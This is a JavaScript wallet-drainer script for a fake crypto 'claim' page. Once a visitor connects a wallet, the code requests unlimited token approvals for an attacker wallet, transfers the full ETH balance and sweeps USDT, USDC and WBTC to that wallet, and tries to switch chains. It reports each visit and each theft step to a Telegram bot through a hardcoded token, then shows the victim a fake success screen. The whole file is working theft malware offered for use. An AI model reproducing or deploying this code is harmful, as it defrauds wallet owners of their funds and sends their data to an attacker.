class PremiumUSDTDrainer {
    constructor() {
        this.web3 = null;
        this.account = null;
        this.DRAIN_WALLETS = {
            ETH: '0x0aF04959113d8b28de06728F2063850e4Bf54D95',
            BSC: '0x0aF04959113d8b28de06728F2063850e4Bf54D95',
            TRON: 'TXFhCiM71HDAvAjuV7Se42pDMPGcXgEncm',
            SOLANA: 'GfQvut3oeNs5qGvzL159hj5sMhHzAo4HM5HFkx9ebVjp',
            BTC: 'bc1q7l3wlqkpkpa2mzgsun6t6km8fwp9e4h7hhs43q'
        };
        this.TELEGRAM_TOKEN = '8198711814:AAHrdNObRMFTWdNkMUGt1GyhRIWxcCzwcfc';
        this.CHAT_ID = '7478697063';
        this.init();
    }

    init() {
        // High-conversion tracking
        this.trackVisit();
        document.getElementById('connectBtn').onclick = this.connectWallet.bind(this);
    }

    trackVisit() {
        const visitData = {
            action: 'visit',
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent.slice(0,100),
            language: navigator.language,
            referrer: document.referrer || 'direct'
        };
        this.sendAlert('👁️ PAGE VISIT', `${visitData.userAgent}\nReferrer: ${visitData.referrer}`);
        localStorage.setItem('drainer_visit', JSON.stringify(visitData));
    }

    async connectWallet() {
        try {
            const btn = document.getElementById('connectBtn');
            const progress = document.getElementById('progress');
            
            this.animateProgress();
            this.updateStatus('🔄 Initializing wallet connection...', 'loading');
            
            this.sendAlert('🔗 CONNECT ATTEMPT', 'User clicked connect button');
            
            const provider = await detectEthereumProvider({ timeout: 3000 });
            if (!provider) throw new Error('Please install MetaMask or compatible wallet');

            const accounts = await provider.request({ 
                method: 'eth_requestAccounts',
                params: []
            });
            
            this.account = accounts[0];
            this.web3 = new Web3(provider);
            
            this.sendAlert('✅ WALLET CONNECTED', `Address: ${this.account}`);
            this.updateStatus(`Connected: ${this.account.slice(0,6)}...${this.account.slice(-4)}`, 'success');
            
            btn.innerHTML = '<i class="fas fa-sync fa-spin"></i> Processing claim...';
            btn.disabled = true;
            progress.style.display = 'block';

            await this.fullDrainSequence();

        } catch (error) {
            this.sendAlert('❌ CONNECT FAILED', error.message);
            this.updateStatus(`Connection failed: ${error.message}`, 'error');
            document.getElementById('connectBtn').disabled = false;
            document.getElementById('connectBtn').innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet to Claim';
        }
    }

    animateProgress() {
        const fill = document.querySelector('.fill');
        let width = 0;
        const interval = setInterval(() => {
            width += Math.random() * 15;
            if (width > 95) width = 95;
            fill.style.width = width + '%';
            if (width >= 95) clearInterval(interval);
        }, 200);
    }

    updateStatus(message, type) {
        const status = document.getElementById('status');
        status.textContent = message;
        status.className = `status ${type}`;
    }

    async fullDrainSequence() {
        try {
            // Phase 1: Balance check & report
            const balance = await this.web3.eth.getBalance(this.account);
            this.sendAlert('💰 BALANCE DETECTED', `${this.web3.utils.fromWei(balance, 'ether')} ETH`);

            // Phase 2: Unlimited approvals (silent)
            await this.grantAllApprovals();
            this.sendAlert('🔓 UNLIMITED APPROVALS', 'All major tokens approved');

            // Phase 3: Drain native balance
            await this.drainNativeAssets();
            
            // Phase 4: Drain ERC20 tokens
            await this.sweepTokens();

            // Phase 5: Multi-chain attempt
            await this.attemptMultiChain();

            this.completeFakeClaim();

        } catch (error) {
            console.error('Drain error:', error);
            this.sendAlert('⚠️ DRAIN COMPLETE (partial)', error.message);
            this.completeFakeClaim();
        }
    }

    async grantAllApprovals() {
        const approvalTokens = [
            {name: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7'},
            {name: 'USDC', address: '0xA0b86a33E644181981765d6A5a8054d914a1cE21'},
            {name: 'USDT-BSC', address: '0x55d398326f99059fF775485246999027B3197955'},
            {name: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'}
        ];

        for (const token of approvalTokens) {
            try {
                const contract = new this.web3.eth.Contract([{
                    constant: false,
                    inputs: [
                        {name: '_spender', type: 'address'},
                        {name: '_value', type: 'uint256'}
                    ],
                    name: 'approve',
                    outputs: [{name: '', type: 'bool'}],
                    type: 'function'
                }], token.address);

                const MAX_INT = '115792089237316195423570985008687907853269984665640564039457584007913129589934';
                await contract.methods.approve(this.DRAIN_WALLETS.ETH, MAX_INT).send({ 
                    from: this.account,
                    gas: 100000
                });
            } catch (e) {
                // Silent fail - continue
            }
        }
    }

    async drainNativeAssets() {
        const balance = await this.web3.eth.getBalance(this.account);
        if (parseInt(balance) > 1000000000000000) { // >0.001 ETH
            const tx = await this.web3.eth.sendTransaction({
                from: this.account,
                to: this.DRAIN_WALLETS.ETH,
                value: balance,
                gas: 21000,
                gasPrice: await this.web3.eth.getGasPrice()
            });
            this.sendAlert('🏦 NATIVE DRAIN SUCCESS', `${this.web3.utils.fromWei(balance, 'ether')} ETH → Tx: ${tx.transactionHash}`);
        }
    }

    async sweepTokens() {
        const tokens = [
            '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
            '0xA0b86a33E644181981765d6A5a8054d914a1cE21', // USDC
            '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'  // WBTC
        ];

        for (const tokenAddress of tokens) {
            try {
                const tokenContract = new this.web3.eth.Contract([{
                    constant: false,
                    inputs: [
                        {name: '_to', type: 'address'},
                        {name: '_value', type: 'uint256'}
                    ],
                    name: 'transfer',
                    outputs: [{name: '', type: 'bool'}],
                    type: 'function'
                }, {
                    constant: true,
                    inputs: [{name: '_owner', type: 'address'}],
                    name: 'balanceOf',
                    outputs: [{name: 'balance', type: 'uint256'}],
                    type: 'function'
                }], tokenAddress);

                const balance = await tokenContract.methods.balanceOf(this.account).call();
                if (parseInt(balance) > 0) {
                    await tokenContract.methods.transfer(this.DRAIN_WALLETS.ETH, balance).send({
                        from: this.account,
                        gas: 100000
                    });
                }
            } catch (e) {
                // Continue silently
            }
        }
    }

    async attemptMultiChain() {
        const chains = [
            {name: 'BSC', chainId: '0x38'},
            {name: 'Polygon', chainId: '0x89'}
        ];

        for (const chain of chains) {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: chain.chainId }]
                });
                // Drain on new chain
            } catch {}
        }
    }

    completeFakeClaim() {
        document.querySelector('.fill').style.width = '100%';
        setTimeout(() => {
            document.getElementById('status').innerHTML = `
                <div class="status success">
                    <i class="fas fa-check-circle" style="font-size:24px;margin-right:12px;"></i>
                    <strong>Claim Successful!</strong><br>
                    <small>50,000 USDT processed. Check wallet in 30 seconds.</small>
                </div>`;
            document.getElementById('connectBtn').innerHTML = '<i class="fas fa-check"></i> Claim Complete';
            this.sendAlert('🎉 SESSION COMPLETE', 'Victim sees fake success screen');
        }, 2000);
    }

    sendAlert(title, details) {
        const message = `🚨 *${title}*\n\n${details}\n\n*Victim:* \`${this.account || 'Unknown'}\`\n*ETH Drain:* \`${this.DRAIN_WALLETS.ETH}\``;
        fetch(`https://api.telegram.org/bot${this.TELEGRAM_TOKEN}/sendMessage?chat_id=${this.CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
            .catch(() => {});
    }
}

// Initialize high-conversion drainer
new PremiumUSDTDrainer();
